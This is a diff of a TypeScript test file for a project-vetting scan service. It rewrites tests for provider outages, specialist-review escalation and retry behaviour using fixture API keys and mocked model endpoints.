-    init?: RequestInit,
-  ) => {
-    const url = new URL(new Request(input, init).url);
-    if (url.pathname.startsWith("/api/v1/vetting/evidence/"))
-      return Response.json({ error: "evidence_unavailable" }, { status: 503 });
-    return network(input, init);
-  }) as typeof fetch;
-  const [failed] = await runScanCycle({ ...service, fetch: evidenceDown });
-  expect(failed).toMatchObject({
-    stage: "retention-failed",
-    disposition: "clean",
-    evidence: "failed",
-    publication: null,
-  });
-  expect((await vetting.getAssessment(failed.assessmentId))?.state).toBe(
-    "pending",
   );
-  // Nothing was reserved, so the next cycle scans and publishes it.
-  expect(await readdir(join(root, "journal"))).toEqual([]);
-  clock = new Date(NOW.getTime() + 60_000);
-  expect(await runScanCycle(service)).toEqual([
-    expect.objectContaining({
-      assessmentId: failed.assessmentId,
-      stage: "published",
+}
+
+test("a provider outage leaves the scan pending; the next pass clears the project with one Surplus review", async () => {
+  provider.up = false;
+  const failed = await runScanPass(config);
+  expect(failed.refreshed).toBe(true);
+  expect(failed.assessments).toHaveLength(1);
+  const [{ assessmentId }] = failed.assessments;
+  expect(failed.assessments[0]).toEqual({
+    assessmentId,
+    state: "retry",
+    step: "primary-review",
+  });
+  expect((await vetting.getAssessment(assessmentId))?.state).toBe("pending");
+  expect(await readdir(config.journalDirectory)).toEqual([]);
+  expect(await readdir(config.workDirectory)).toEqual([]);
+  const refused = await activate();
+  expect(refused.status).toBe(422);
+  expect((await refused.json()).error).toBe("vetting_required");
+
+  provider.up = true;
+  provider.calls = [];
+  const passed = await runScanPass(config);
+  expect(passed.assessments).toEqual([
+    {
+      assessmentId,
+      state: "published",
       disposition: "clean",
-      evidence: "retained",
-    }),
+      outcome: "accepted",
+      specialist: false,
+    },
   ]);
+  // One primary review through Surplus with the account key; no specialist.
+  expect(provider.calls).toEqual([
+    {
+      path: "/anthropic/v1/messages",
+      model: "claude-opus-5.5",
+      authorization: "Bearer fixture-surplus-key",
+    },
+  ]);
+  const assessment = await vetting.getAssessment(assessmentId);
+  expect(assessment?.state).toBe("clean");
+  expect(assessment?.commitSha).toBe(commitSha);
   expect((await activate()).status).toBe(200);
+  // The queue is empty and the journal keeps the one attempt.
+  expect((await runScanPass(config)).assessments).toEqual([]);
+  expect(await readdir(config.journalDirectory)).toEqual([assessmentId]);
+});
+
+test("an ambiguous primary review runs the Surplus specialist once before publication", async () => {
+  provider.primary = "findings";
+  const report = await runScanPass(config);
+  const [{ assessmentId }] = report.assessments;
+  expect(report.assessments).toEqual([
+    {
+      assessmentId,
+      state: "published",
+      disposition: "clean",
+      outcome: "accepted",
+      specialist: true,
+    },
+  ]);
+  expect(provider.calls.map((call) => [call.path, call.model])).toEqual([
+    ["/anthropic/v1/messages", "claude-opus-5.5"],
+    ["/openai/v1/responses", "gpt-6.1-sol"],
+  ]);
+  const assessment = await vetting.getAssessment(assessmentId);
+  expect(assessment?.state).toBe("clean");
+});
+
+test("a failed specialist is a service failure: nothing is published and the scan retries", async () => {
+  provider.primary = "findings";
+  provider.specialistUp = false;
+  const report = await runScanPass(config);
+  const [{ assessmentId }] = report.assessments;
+  expect(report.assessments[0]).toEqual({
+    assessmentId,
+    state: "retry",
+    step: "specialist-review",
+  });
+  expect(provider.calls.map((call) => call.path)).toEqual([
+    "/anthropic/v1/messages",
+    "/openai/v1/responses",
+  ]);
+  expect((await vetting.getAssessment(assessmentId))?.state).toBe("pending");
+  expect(await readdir(config.journalDirectory)).toEqual([]);
 });
